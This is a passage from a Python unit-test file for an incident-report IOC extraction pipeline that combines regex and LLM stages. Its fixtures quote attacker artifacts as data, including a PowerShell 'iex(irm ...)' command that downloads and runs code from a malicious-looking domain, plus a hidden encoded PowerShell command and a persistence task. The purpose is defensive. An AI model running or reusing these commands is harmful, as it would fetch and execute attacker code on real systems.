        build_plan = self.extractor_module._semantic_stage.build_semantic_task_plan
        report = (
            "Overview\n--------\n"
            "Analyst prose without direct process keywords.\n\n"
            "Odd Vendor Section\n------------------\n"
            "Novel field: remote blob identifier abc123\n"
        )

        tasks = build_plan(report, {'iocs': {}, 'extraction_summary': {}})

        task_names = [task['task_name'] for task in tasks]
        self.assertNotIn('semantic_residual_review', task_names)

    def test_semantic_persistence_actions_not_routed_for_generic_scheduled_task_persistence(self):
        build_plan = self.extractor_module._semantic_stage.build_semantic_task_plan
        report = (
            "Persistence\n-----------\n"
            "Huntress reported scheduled-task persistence. Delete Scheduled Task - name: IntelSoftwareUpdater.\n"
            "The task launches pythonw.exe and run.pyw.\n"
        )

        tasks = build_plan(report, {'iocs': {}, 'extraction_summary': {}})
        task_names = [task['task_name'] for task in tasks]

        self.assertIn('semantic_process_relationships', task_names)
        self.assertNotIn('semantic_persistence_actions', task_names)

    def test_clickfix_semantic_fixture_preserves_ownership_and_forensic_restraint(self):
        report = (
            "Identity\n--------\n"
            "Affected user ACMATCORP\\CPalmero has SID S-1-5-21-506201442-1415125562-945835055-3369. "
            "Huntress recommends a password reset, but the report does not establish exposed credentials "
            "or that the account itself was compromised.\n\n"
            "Process Evidence\n----------------\n"
            "Observed PowerShell execution by user CPalmero. Executable: "
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. Parent: "
            "C:\\Windows\\explorer.exe. Process ID: b3358b0c-94e1-11f1-a6f4-98bd80f159f4. "
            "Command: \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -c "
            "\"iex(irm xkclcvlfophks.karburatorotzhigi.com/s/psc4/pr?cl -UseBasicParsing)\".\n\n"
            "Scheduled Task Persistence\n--------------------------\n"
            "Reported scheduled task persistence: IntelSoftwareUpdater launches "
            "C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe "
            "with script run.pyw. Remediation separately says to delete scheduled task IntelSoftwareUpdater. "
            "The vendor field label Service Path refers to the scheduled-task executable path, not a Windows service.\n\n"
            "Registry and Web Shell Review\n-----------------------------\n"
            "No registry modification is established. No credential theft mechanism is established. "
            "No web shell is established.\n"
        )
        command = (
            '"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -c '
            '"iex(irm xkclcvlfophks.karburatorotzhigi.com/s/psc4/pr?cl -UseBasicParsing)"'
        )
        identity_payload = {
            'affected_users': [
                {
                    'username': 'ACMATCORP\\CPalmero',
                    'sid': 'S-1-5-21-506201442-1415125562-945835055-3369',
                    'evidence': 'Affected user ACMATCORP\\CPalmero has SID S-1-5-21-506201442-1415125562-945835055-3369.',
                }
            ],
            'credential_exposure_users': [],
            'compromised_users': [],
            'created_users': [],
            'passwords_observed': [],
        }
        process_payload = {
            'commands': [
                {
                    'full_command': command,
                    'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                    'parent_process': 'C:\\Windows\\explorer.exe',
                    'user': 'CPalmero',
                    'pid': 'b3358b0c-94e1-11f1-a6f4-98bd80f159f4',
                    'evidence': 'Observed PowerShell execution by user CPalmero.',
                    'evidence_origin': 'observed',
                }
            ],
            'services': [],
            'scheduled_tasks': [
                {
                    'name': 'IntelSoftwareUpdater',
                    'path': 'C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe',
                    'command': 'run.pyw',
                    'action': None,
                    'evidence': 'Reported scheduled task persistence: IntelSoftwareUpdater launches pythonw.exe with script run.pyw.',
                    'evidence_origin': 'reported_finding',
                },
                {
                    'name': 'IntelSoftwareUpdater',
                    'path': None,
                    'command': None,
                    'action': 'delete',
                    'evidence': 'Remediation separately says to delete scheduled task IntelSoftwareUpdater.',
                    'evidence_origin': 'remediation',
                },
            ],
        }
        persistence_payload = {
            'registry': [],
            'credential_theft_indicators': [],
            'webshells': [],
        }
        provider = self._SequencedSemanticProvider({
            'semantic_identity_and_auth': [self._semantic_result(identity_payload)],
            'semantic_process_relationships': [self._semantic_result(process_payload)],
            'semantic_persistence_actions': [self._semantic_result(persistence_payload)],
        })

        extraction, used_ai = self.extractor_module.run_ioc_pipeline_with_provider(
            report,
            provider,
            pipeline_mode='semantic',
            model_name='fake-semantic-model',
        )

        self.assertTrue(used_ai)
        self.assertEqual(extraction['extraction_summary']['method'], 'deterministic_plus_semantic')
        users = extraction['iocs']['users']
        self.assertTrue(
            any(
                item['value'] == 'ACMATCORP\\CPalmero'
                and item.get('sid') == 'S-1-5-21-506201442-1415125562-945835055-3369'
                and item.get('context') == 'Affected user in report'
                for item in users
            )
        )
        self.assertFalse(any(item.get('context') == 'Credential exposure candidate' for item in users))
        self.assertFalse(any(item.get('context') == 'Compromised user in report' for item in users))
        self.assertTrue(any(item['value'] == command for item in extraction['iocs']['commands']))
        command_item = next(item for item in extraction['iocs']['commands'] if item['value'] == command)
        self.assertEqual(command_item['executable'], 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe')
        self.assertEqual(command_item['parent'], 'C:\\Windows\\explorer.exe')
        self.assertEqual(command_item['user'], 'CPalmero')
        self.assertEqual(command_item['pid'], 'b3358b0c-94e1-11f1-a6f4-98bd80f159f4')

        tasks = extraction['iocs']['scheduled_tasks']
        self.assertTrue(
            any(
                item['name'] == 'IntelSoftwareUpdater'
                and item.get('path') == 'C:\\Users\\CPalmero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.PythonApp_mlzxcs7w1yl1c\\pythonw.exe'
                and item.get('command') == 'run.pyw'
                and item.get('evidence_origin') == 'reported_finding'
                for item in tasks
            )
        )
        self.assertTrue(
            any(
                item['name'] == 'IntelSoftwareUpdater'
                and item.get('action') == 'delete'
                and item.get('evidence_origin') == 'remediation'
                for item in tasks
            )
        )
        self.assertEqual(extraction['iocs']['services'], [])
        self.assertEqual(extraction['iocs']['registry_keys'], [])
        self.assertEqual(extraction['iocs']['credentials'], [])

    def test_filter_semantic_payload_for_task_strips_process_task_user_leakage(self):
        payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        payload['affected_users'] = [{'username': 'PBellagamba', 'sid': 'S-1-5-21-1'}]
        payload['process_iocs']['commands'] = [
            {
                'full_command': '"C:\\WINDOWS\\System32\\WScript.exe" "C:\\temp\\View Document March 10.vbs"',
                'executable': 'C:\\WINDOWS\\System32\\WScript.exe',
                'parent_process': 'C:\\WINDOWS\\Explorer.EXE',
                'user': 'PBellagamba',
                'pid': '1234',
            }
        ]

        filtered, filter_meta = self.extractor_module._filter_semantic_payload_for_task(
            'semantic_process_relationships',
            payload,
        )

        self.assertEqual(filtered['affected_users'], [])
        self.assertEqual(len(filtered['process_iocs']['commands']), 1)
        self.assertEqual(filtered['authentication_iocs']['compromised_users'], [])
        self.assertIn('affected_users', filter_meta['stripped_fields'])

    def test_filter_semantic_payload_for_task_preserves_affected_hosts_context(self):
        payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        payload['affected_hosts'] = ['HOST-A']
        payload['network_iocs']['domains'] = [{'value': 'evil.example'}]

        filtered, filter_meta = self.extractor_module._filter_semantic_payload_for_task(
            'semantic_identity_and_auth',
            payload,
        )

        self.assertEqual(filtered['affected_hosts'], ['HOST-A'])
        self.assertIn('affected_hosts', filter_meta['preserved_context_fields'])
        self.assertIn('network_iocs.domains', filter_meta['stripped_fields'])

    def test_ai_hash_type_is_corrected_by_value_length(self):
        normalize = self.extractor_module._normalize_ai_extraction
        hash_value = '8377628b3160d32f33ace0119f6823aa9e7b1e3ca8ad60854d2fdc958aec67c9'
        extraction = {
            'affected_hosts': [],
            'affected_users': [],
            'network_iocs': {'ipv4': [], 'ipv6': [], 'domains': [], 'urls': [], 'cloudflare_tunnels': []},
            'file_iocs': {
                'hashes': [{'value': hash_value, 'type': 'sha1'}],
                'file_paths': [],
                'file_names': [],
            },
            'process_iocs': {'commands': [], 'services': [], 'scheduled_tasks': []},
            'persistence_iocs': {'registry': [], 'credential_theft_indicators': []},
            'authentication_iocs': {'compromised_users': [], 'created_users': [], 'passwords_observed': []},
            'vulnerability_iocs': {'cves': [], 'webshells': []},
            'raw_artifacts': {'encoded_powershell': [], 'vnc_connection_ids': [], 'screenconnect_ids': []},
        }

        normalized = normalize(extraction, '')

        self.assertEqual(normalized['iocs']['hashes'][0]['type'], 'sha256')
        self.assertIn('Hash type corrected from sha1 to sha256', normalized['iocs']['hashes'][0]['validation_warnings'][0])

    def test_ai_command_not_found_in_source_is_removed_before_import(self):
        normalize = self.extractor_module._normalize_ai_extraction
        extraction = {
            'affected_hosts': [],
            'affected_users': [],
            'network_iocs': {'ipv4': [], 'ipv6': [], 'domains': [], 'urls': [], 'cloudflare_tunnels': []},
            'file_iocs': {'hashes': [], 'file_paths': [], 'file_names': []},
            'process_iocs': {
                'commands': [
                    {'full_command': r'msiexec.exe /i C:\Users\bdalene\Downloads\ScreenConnect.ClientSetup.msi'},
                    {'full_command': r'C:\Users\bdalene\Downloads\Alpemix1.exe servicestartxxx'},
                ],
                'services': [],
                'scheduled_tasks': [],
            },
            'persistence_iocs': {'registry': [], 'credential_theft_indicators': []},
            'authentication_iocs': {'compromised_users': [], 'created_users': [], 'passwords_observed': []},
            'vulnerability_iocs': {'cves': [], 'webshells': []},
            'raw_artifacts': {'encoded_powershell': [], 'vnc_connection_ids': [], 'screenconnect_ids': []},
        }

        normalized = normalize(
            extraction,
            r'Observed command: C:\\Users\\bdalene\\Downloads\\Alpemix1.exe servicestartxxx',
        )

        self.assertEqual(
            [item['value'] for item in normalized['iocs']['commands']],
            [r'C:\Users\bdalene\Downloads\Alpemix1.exe servicestartxxx'],
        )
        self.assertEqual(
            normalized['extraction_summary']['rejected_candidates'][0]['reason'],
            'not_found_verbatim_in_normalized_source',
        )

    def test_ioc_schema_annotations_expose_trust_and_provenance(self):
        records_from_extraction = self.extractor_module._ioc_schema.records_from_extraction
        build_lookup = self.extractor_module._ioc_schema.build_record_lookup
        annotate = self.extractor_module._ioc_schema.annotate_import_entry

        records = records_from_extraction(
            {
                'iocs': {
                    'domains': [{'value': 'evil.example', 'context': 'source domain'}],
                },
                'extraction_summary': {'semantic_sections': ['Network']},
            },
            source='llm',
            trust_tier=self.extractor_module._ioc_schema.TRUST_LOW,
        )

        entry = annotate(
            {'value': 'evil.example', 'ioc_type': 'Domain'},
            build_lookup(records),
            lookup_type='Domain',
            lookup_value='evil.example',
        )

        self.assertEqual(entry['provenance_source'], 'llm')
        self.assertEqual(entry['trust_tier'], 'low')
        self.assertEqual(entry['provenance_section'], 'Network')

    def test_merge_ai_extractions_combines_summary_hosts_and_users(self):
        merge_ai = self.extractor_module._merge_ai_extractions

        primary = {
            'extraction_summary': {
                'affected_hosts': ['HOST-A'],
                'affected_users': [{'username': 'alice', 'sid': 'S-1-5-21-1'}],
            },
            'iocs': {'domains': [{'value': 'a.example', 'context': ''}]},
            'raw_artifacts': {},
        }
        secondary = {
            'extraction_summary': {
                'affected_hosts': ['HOST-B'],
                'affected_users': [{'username': 'bob', 'sid': 'S-1-5-21-2'}],
            },
            'iocs': {'domains': [{'value': 'b.example', 'context': ''}]},
            'raw_artifacts': {},
        }

        merged = merge_ai(primary, secondary)

        self.assertEqual(
            sorted(merged['extraction_summary']['affected_hosts']),
            ['HOST-A', 'HOST-B'],
        )
        usernames = sorted(user['username'] for user in merged['extraction_summary']['affected_users'])
        self.assertEqual(usernames, ['alice', 'bob'])
        self.assertEqual(
            sorted(item['value'] for item in merged['iocs']['domains']),
            ['a.example', 'b.example'],
        )

    def test_ai_guardrails_drop_placeholders_restore_https_and_backfill_domains(self):
        normalize = self.extractor_module._normalize_ai_extraction
        report_text = (
            "Investigative Summary:\n"
            "Huntress observed that the malicious Zip file was downloaded from the URL "
            "'https://document-auth[.]icu/doc/S23-MEP-SNAG.pdf'.\n"
            "User: PBellagamba\n"
        )
        extraction = {
            'affected_hosts': ['...'],
            'affected_users': [{'username': 'PBellagamba', 'sid': 'S-1-5-21-1'}],
            'network_iocs': {
                'ipv4': [],
                'ipv6': [],
                'domains': [],
                'urls': [{'value': 'http://document-auth.icu/doc/S23-MEP-SNAG.pdf', 'context': 'source'}],
                'cloudflare_tunnels': [],
            },
            'file_iocs': {'hashes': [], 'file_paths': [], 'file_names': []},
            'process_iocs': {'commands': [], 'services': [], 'scheduled_tasks': []},
            'persistence_iocs': {'registry': [], 'credential_theft_indicators': []},
            'authentication_iocs': {
                'compromised_users': [{'username': 'PBellagamba', 'sid': 'S-1-5-21-1'}],
                'created_users': [],
                'passwords_observed': [],
            },
            'vulnerability_iocs': {'cves': [], 'webshells': []},
            'raw_artifacts': {'encoded_powershell': [], 'vnc_connection_ids': [], 'screenconnect_ids': []},
        }

        normalized = normalize(extraction, report_text)

        self.assertEqual(normalized['extraction_summary']['affected_hosts'], [])
        self.assertEqual(
            normalized['iocs']['urls'][0]['value'],
            'https://document-auth.icu/doc/S23-MEP-SNAG.pdf',
        )
        self.assertEqual(
            normalized['iocs']['domains'][0]['value'],
            'document-auth.icu',
        )
        self.assertEqual(
            [user['value'] for user in normalized['iocs']['users']],
            ['PBellagamba'],
        )

    def test_ai_guardrails_backfill_file_names_from_paths_and_hashes(self):
        normalize = self.extractor_module._normalize_ai_extraction
        extraction = {
            'affected_hosts': [],
            'affected_users': [],
            'network_iocs': {'ipv4': [], 'ipv6': [], 'domains': [], 'urls': [], 'cloudflare_tunnels': []},
            'file_iocs': {
                'hashes': [
                    {'value': '8377628b3160d32f33ace0119f6823aa9e7b1e3ca8ad60854d2fdc958aec67c9', 'type': 'sha256', 'filename': 'curl-debug.txt'},
                ],
                'file_paths': [
                    {'value': r'C:\Users\pbellagamba\Downloads\p11341.exe', 'context': ''},
                ],
                'file_names': [],
            },
            'process_iocs': {'commands': [], 'services': [], 'scheduled_tasks': []},
            'persistence_iocs': {'registry': [], 'credential_theft_indicators': []},
            'authentication_iocs': {'compromised_users': [], 'created_users': [], 'passwords_observed': []},
            'vulnerability_iocs': {'cves': [], 'webshells': []},
            'raw_artifacts': {'encoded_powershell': [], 'vnc_connection_ids': [], 'screenconnect_ids': []},
        }

        normalized = normalize(extraction, '')

        self.assertEqual(
            sorted(normalized['iocs']['file_names']),
            ['curl-debug.txt', 'p11341.exe'],
        )

    def test_process_extraction_for_import_dedupes_known_users_from_iocs_and_summary(self):
        previous_models_ioc = sys.modules.get('models.ioc')
        previous_models_known_system = sys.modules.get('models.known_system')
        previous_models_known_user = sys.modules.get('models.known_user')
        previous_models_database = sys.modules.get('models.database')
        previous_utils_opencti = sys.modules.get('utils.opencti')

        class FakeIOC:
            @staticmethod
            def find_by_value(_value, _ioc_type, case_id=None):
                return None

        fake_ioc_module = types.ModuleType('models.ioc')
        fake_ioc_module.IOC = FakeIOC
        fake_ioc_module.get_category_for_type = lambda _ioc_type: 'Authentication'

        class FakeKnownSystem:
            @staticmethod
            def find_by_hostname_or_alias(hostname, case_id=None):
                return None, None

        fake_known_system_module = types.ModuleType('models.known_system')
        fake_known_system_module.KnownSystem = FakeKnownSystem

        class FakeKnownUser:
            @staticmethod
            def find_by_username_sid_alias_or_email(username=None, sid=None, case_id=None):
                return None, None

        fake_known_user_module = types.ModuleType('models.known_user')
        fake_known_user_module.KnownUser = FakeKnownUser

        fake_database_module = types.ModuleType('models.database')
        fake_database_module.db = object()

        fake_opencti_module = types.ModuleType('utils.opencti')
        fake_opencti_module.maybe_auto_enrich_iocs = lambda iocs: {}

        sys.modules['models.ioc'] = fake_ioc_module
        sys.modules['models.known_system'] = fake_known_system_module
        sys.modules['models.known_user'] = fake_known_user_module
        sys.modules['models.database'] = fake_database_module
        sys.modules['utils.opencti'] = fake_opencti_module

        try:
            processed = self.extractor_module.process_extraction_for_import(
                extraction={
                    'iocs': {
                        'users': [
                            {
                                'value': 'PBellagamba',
                                'sid': 'S-1-5-21-2314801161-1704214360-4192781938-2626',
                                'context': 'Compromised user in report',
                            }
                        ],
                    },
                    'extraction_summary': {
                        'affected_users': [
                            {
                                'username': 'PBellagamba',
                                'sid': 'S-1-5-21-2314801161-1704214360-4192781938-2626',
                            }
                        ],
                    },
                    '_ioc_records': [],
                },
                case_id=42,
                username='tester',
            )
        finally:
            if previous_models_ioc is not None:
                sys.modules['models.ioc'] = previous_models_ioc
            else:
                sys.modules.pop('models.ioc', None)
            if previous_models_known_system is not None:
                sys.modules['models.known_system'] = previous_models_known_system
            else:
                sys.modules.pop('models.known_system', None)
            if previous_models_known_user is not None:
                sys.modules['models.known_user'] = previous_models_known_user
            else:
                sys.modules.pop('models.known_user', None)
            if previous_models_database is not None:
                sys.modules['models.database'] = previous_models_database
            else:
                sys.modules.pop('models.database', None)
            if previous_utils_opencti is not None:
                sys.modules['utils.opencti'] = previous_utils_opencti
            else:
                sys.modules.pop('utils.opencti', None)

        self.assertEqual(len(processed['known_users_results']), 1)
        self.assertEqual(processed['known_users_results'][0]['username'], 'PBellagamba')
        self.assertEqual(
            processed['known_users_results'][0]['sid'],
            'S-1-5-21-2314801161-1704214360-4192781938-2626',
        )

    def test_regex_extractor_captures_vendor_neutral_structured_activity(self):
        extractor = self.extractor_module.RegexIOCExtractor()
        report = (
            "Microsoft Defender XDR Incident\n"
            "Host: FIN-LAPTOP-9\n"
            "User: maria.lopez\n"
            "ProcessCommandLine = powershell.exe -windowstyle hidden -enc SQBFAFgA\n"
            "Parent Process: explorer.exe\n"
            "RegistryKey = HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BootstrapSvc\n"
            "Service Name: BootstrapSvc\n"
            "Scheduled Task: \\Microsoft\\Windows\\Bootstrap\\Updater\n"
        )

        extraction = extractor.extract(report)

        self.assertIn('FIN-LAPTOP-9', extraction['extraction_summary']['affected_hosts'])
        self.assertIn(
            {'username': 'maria.lopez', 'sid': None},
            extraction['extraction_summary']['affected_users'],
        )
        self.assertTrue(
            any(item['value'] == 'powershell.exe -windowstyle hidden -enc SQBFAFgA' for item in extraction['iocs']['commands'])
        )
        self.assertTrue(
            any(item['name'] == 'BootstrapSvc' for item in extraction['iocs']['services'])
        )
        self.assertTrue(
            any(item['name'] == r'\Microsoft\Windows\Bootstrap\Updater' for item in extraction['iocs']['scheduled_tasks'])
        )
        self.assertTrue(
            any(item['value'] == r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\BootstrapSvc' for item in extraction['iocs']['registry_keys'])
        )

    def test_affected_host_is_relevant_but_not_confirmed_compromised(self):
        report = "Host: FIN-LAPTOP-9"
        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)

        self.assertIn('FIN-LAPTOP-9', extraction['extraction_summary']['affected_hosts'])
        self.assertEqual(extraction['extraction_summary'].get('confirmed_compromised_hosts'), [])

        processed = self._process_with_fake_known_systems(extraction)

        self.assertTrue(processed['known_systems_results'])
        self.assertFalse(any(item['now_compromised'] for item in processed['known_systems_results']))

    def test_affected_endpoint_is_not_confirmed_compromised(self):
        report = "Affected Endpoint: FIN-LAPTOP-9"
        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)

        self.assertIn('FIN-LAPTOP-9', extraction['extraction_summary']['affected_hosts'])
        self.assertEqual(extraction['extraction_summary'].get('confirmed_compromised_hosts'), [])

    def test_explicit_compromised_host_state_is_scoped_to_named_host(self):
        report = (
            "Host: FIN-LAPTOP-9\n"
            "Host: HR-LAPTOP-2\n"
            "The attacker compromised FIN-LAPTOP-9.\n"
        )
        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)

        self.assertEqual(
            extraction['extraction_summary'].get('confirmed_compromised_hosts'),
            ['FIN-LAPTOP-9'],
        )
        processed = self._process_with_fake_known_systems(extraction)
        states = {
            item['hostname']: item['now_compromised']
            for item in processed['known_systems_results']
        }

        self.assertTrue(states['FIN-LAPTOP-9'])
        self.assertFalse(states['HR-LAPTOP-2'])

    def test_generic_summary_keeps_structural_type_and_evidence_classes(self):
        normalizer = self.extractor_module._report_normalizer
        report = (
            "Summary\n-------\n"
            "User: maria.lopez\n"
            "Host: FIN-LAPTOP-9\n"
            "Command: powershell.exe -nop\n"
            "Domain: evil.example\n"
            "Scheduled Task: IntelSoftwareUpdater\n"
        )

        canonical = normalizer.normalize_report_source(report)
        section = canonical.sections[0]
        tasks = self.extractor_module._semantic_stage.build_semantic_task_plan(
            normalizer.render_canonical_report_text(canonical),
            {'iocs': {'commands': [], 'services': [], 'scheduled_tasks': []}, 'extraction_summary': {}},
            canonical_report=canonical,
        )
        task_names = {task['task_name'] for task in tasks}

        self.assertEqual(section.canonical_type, 'summary')
        self.assertIn('identity', section.evidence_classes)
        self.assertIn('host', section.evidence_classes)
        self.assertIn('process', section.evidence_classes)
        self.assertIn('network', section.evidence_classes)
        self.assertIn('semantic_identity_and_auth', task_names)
        self.assertIn('semantic_process_relationships', task_names)

    def test_deterministic_provenance_uses_exact_section_not_first_section(self):
        report = (
            "Investigative Summary\n---------------------\n"
            "Summary text only.\n\n"
            "Network\n-------\n"
            "Observed callback to evil.com.\n"
        )
        extraction = self.extractor_module.run_deterministic_ioc_extraction(report)
        domain_record = next(
            record for record in extraction['_ioc_records']
            if record['ioc_type'] == 'Domain' and record['value'] == 'evil.com'
        )

        self.assertEqual(domain_record['evidence_source_section'], 'Network')
        self.assertEqual(domain_record['canonical_section'], 'network')
        self.assertEqual(domain_record['evidence_refs'][0]['source_section'], 'Network')

    def test_no_first_section_fallback_when_section_unknown(self):
        records = self.extractor_module._ioc_schema.records_from_extraction(
            {
                'iocs': {'domains': [{'value': 'evil.com'}]},
                'extraction_summary': {
                    'source_provenance': {
                        'source_type': 'generic',
                        'sections': [
                            {'source_section': 'Investigative Summary', 'canonical_section': 'summary'},
                            {'source_section': 'Network', 'canonical_section': 'network'},
                        ],
                    }
                },
            },
            source='regex',
            trust_tier=self.extractor_module._ioc_schema.TRUST_HIGH,
        )

        self.assertEqual(records[0]['evidence_source_section'], '')
        self.assertEqual(records[0]['canonical_section'], '')

    def test_semantic_evidence_resolves_to_exact_source_section(self):
        report = (
            "Investigative Summary\n---------------------\n"
            "Summary only.\n\n"
            "Process Evidence\n----------------\n"
            "Command: cmd.exe /c whoami\n"
        )
        provider = self._SequencedSemanticProvider({
            'semantic_process_relationships': [
                self._semantic_result({
                    'commands': [
                        {
                            'full_command': 'cmd.exe /c whoami',
                            'executable': 'cmd.exe',
                            'parent_process': None,
                            'user': None,
                            'pid': None,
                            'evidence': 'Command: cmd.exe /c whoami',
                            'evidence_origin': 'observed',
                        }
                    ],
                    'services': [],
                    'scheduled_tasks': [],
                })
            ],
        })

        extraction, _used_ai = self.extractor_module.run_ioc_pipeline_with_provider(
            report,
            provider,
            pipeline_mode='semantic',
        )
        command_record = next(
            record for record in extraction['_ioc_records']
            if record['ioc_type'] == 'Command Line' and record['value'] == 'cmd.exe /c whoami'
        )

        self.assertEqual(command_record['evidence_source_section'], 'Process Evidence')
        self.assertEqual(command_record['canonical_section'], 'process')

    def test_canonical_report_can_flow_without_source_redetection(self):
        normalizer = self.extractor_module._report_normalizer
        canonical = normalizer.normalize_report_source(
            "Network\n-------\nObserved evil.com\n"
        )
        original_source_adapters = normalizer._source_adapters
        normalizer._source_adapters = lambda: (_ for _ in ()).throw(AssertionError('source redetected'))
        try:
            extraction = self.extractor_module.run_deterministic_ioc_extraction(
                canonical_report=canonical,
            )
        finally:
            normalizer._source_adapters = original_source_adapters

        self.assertTrue(
            any(item['value'] == 'evil.com' for item in extraction['iocs']['domains'])
        )

    def test_partial_scheduled_task_remediation_is_preserved_with_null_unknowns(self):
        extractor = self.extractor_module.RegexIOCExtractor()

        extraction = extractor.extract("Delete Scheduled Task - name: UpdateService")
        tasks = extraction['iocs']['scheduled_tasks']

        self.assertEqual(len(tasks), 1)
        self.assertEqual(tasks[0]['name'], 'UpdateService')
        self.assertIsNone(tasks[0]['path'])
        self.assertIsNone(tasks[0]['command'])
        self.assertEqual(tasks[0]['evidence_origin'], 'remediation')

    def test_two_scheduled_task_remediation_targets_are_retained(self):
        extractor = self.extractor_module.RegexIOCExtractor()
        report = (
            "Delete Scheduled Task - name: UpdateService\n"
            "Delete Scheduled Task - name: WmiPrvSE\n"
        )

        extraction = extractor.extract(report)
        task_names = sorted(item['name'] for item in extraction['iocs']['scheduled_tasks'])

        self.assertEqual(task_names, ['UpdateService', 'WmiPrvSE'])

    def test_affected_user_with_infostealer_is_not_confirmed_compromised(self):
        normalize = self.extractor_module._normalize_ai_extraction
        extraction = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        extraction['affected_users'] = [{'username': 'DFollacchio', 'sid': None}]
        extraction['authentication_iocs']['credential_exposure_users'] = [
            {'username': 'DFollacchio', 'sid': None, 'evidence': 'Infostealer executed in the user context.'}
        ]
        extraction['authentication_iocs']['compromised_users'] = [
            {'username': 'DFollacchio', 'sid': None}
        ]
        report = "User: DFollacchio\nInfostealer executed in DFollacchio user context; credentials may have been targeted."

        normalized = normalize(extraction, report)

        contexts = [item.get('context') for item in normalized['iocs']['users']]
        self.assertIn('Affected user in report', contexts)
        self.assertIn('Credential exposure candidate', contexts)
        self.assertNotIn('Compromised user in report', contexts)

    def test_identity_task_projection_preserves_authentication_fields(self):
        project = self.extractor_module._semantic_stage._canonical_from_task_payload
        payload = {
            'affected_users': [{'username': 'DFollacchio', 'sid': None}],
            'credential_exposure_users': [
                {
                    'username': 'DFollacchio',
                    'sid': None,
                    'evidence': 'Infostealer executed in the user context.',
                }
            ],
            'compromised_users': [{'username': 'jsmith', 'sid': None, 'evidence': 'The attacker authenticated successfully using account jsmith.'}],
            'created_users': [{'username': 'svc-backup', 'sid': None, 'password': None, 'groups': [], 'evidence': 'Attacker created account svc-backup.'}],
            'passwords_observed': [{'username': 'svc-backup', 'password': 'P@ssw0rd!', 'evidence': 'Password P@ssw0rd! was observed for svc-backup.'}],
        }

        projected = project('semantic_identity_and_auth', payload)

        self.assertEqual(projected['affected_users'][0]['username'], 'DFollacchio')
        auth = projected['authentication_iocs']
        self.assertEqual(auth['credential_exposure_users'][0]['username'], 'DFollacchio')
        self.assertEqual(auth['compromised_users'][0]['username'], 'jsmith')
        self.assertEqual(auth['created_users'][0]['username'], 'svc-backup')
        self.assertEqual(auth['passwords_observed'][0]['password'], 'P@ssw0rd!')

    def test_identity_task_projection_accepts_already_canonical_payload(self):
        project = self.extractor_module._semantic_stage._canonical_from_task_payload
        canonical = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        canonical['authentication_iocs']['credential_exposure_users'] = [
            {'username': 'DFollacchio', 'sid': None, 'evidence': 'Credential exposure evidence.'}
        ]

        projected = project('semantic_identity_and_auth', canonical)

        self.assertEqual(projected['authentication_iocs']['credential_exposure_users'][0]['username'], 'DFollacchio')

    def test_explicit_compromised_account_classification_is_allowed(self):
        normalize = self.extractor_module._normalize_ai_extraction
        extraction = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        extraction['authentication_iocs']['compromised_users'] = [
            {'username': 'jsmith', 'sid': None, 'evidence': 'The attacker authenticated successfully using account jsmith.'}
        ]

        normalized = normalize(
            extraction,
            "The attacker authenticated successfully using account jsmith.",
        )

        self.assertTrue(
            any(
                item['value'] == 'jsmith' and item.get('context') == 'Compromised user in report'
                for item in normalized['iocs']['users']
            )
        )

    def test_compromise_wording_for_one_account_does_not_promote_other_user(self):
        normalize = self.extractor_module._normalize_ai_extraction
        extraction = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        extraction['authentication_iocs']['compromised_users'] = [
            {
                'username': 'jsmith',
                'sid': None,
                'evidence': 'The attacker authenticated successfully using account jsmith.',
            },
            {
                'username': 'DFollacchio',
                'sid': None,
                'evidence': 'Malware executed while DFollacchio was logged in.',
            },
        ]
        report = (
            'The attacker authenticated successfully using account jsmith.\n'
            'Malware executed while DFollacchio was logged in.'
        )

        normalized = normalize(extraction, report)
        compromised_users = [
            item['value']
            for item in normalized['iocs']['users']
            if item.get('context') == 'Compromised user in report'
        ]

        self.assertEqual(compromised_users, ['jsmith'])

    def test_attacker_created_account_behavior_still_works(self):
        normalize = self.extractor_module._normalize_ai_extraction
        extraction = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        extraction['authentication_iocs']['created_users'] = [
            {
                'username': 'svc-backup',
                'sid': None,
                'password': 'TempPass123!',
                'groups': ['Administrators'],
                'evidence': 'The attacker created account svc-backup.',
            }
        ]

        normalized = normalize(extraction, 'The attacker created account svc-backup.')

        self.assertTrue(
            any(
                item['value'] == 'svc-backup' and item.get('context') == 'Attacker-created account'
                for item in normalized['iocs']['users']
            )
        )
        self.assertTrue(
            any(item['username'] == 'svc-backup' and item['value'] == 'TempPass123!' for item in normalized['iocs']['credentials'])
        )

    def test_semantic_task_prompts_define_evidence_item_shapes(self):
        prompts = self.extractor_module._ioc_contract.IOC_SEMANTIC_TASK_PROMPTS

        self.assertIn('"evidence":"string"', prompts['semantic_identity_and_auth'])
        self.assertIn('"evidence_origin":"observed|reported_finding|remediation"', prompts['semantic_process_relationships'])
        self.assertIn('"registry_key":"string|null"', prompts['semantic_persistence_actions'])
        self.assertNotIn('semantic_residual_review', prompts)

    def test_semantic_candidate_count_ignores_metadata_lists(self):
        count_candidates = self.extractor_module._semantic_stage._count_semantic_candidates
        payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        payload['affected_users'] = [{'username': 'DFollacchio', 'sid': None}]
        payload['process_iocs']['scheduled_tasks'] = [{'name': 'UpdateService', 'path': None, 'command': None}]
        payload['extraction_summary'] = {
            'semantic_sections': ['Overview', 'Remediation'],
            'validation_warnings': ['warning-one'],
        }

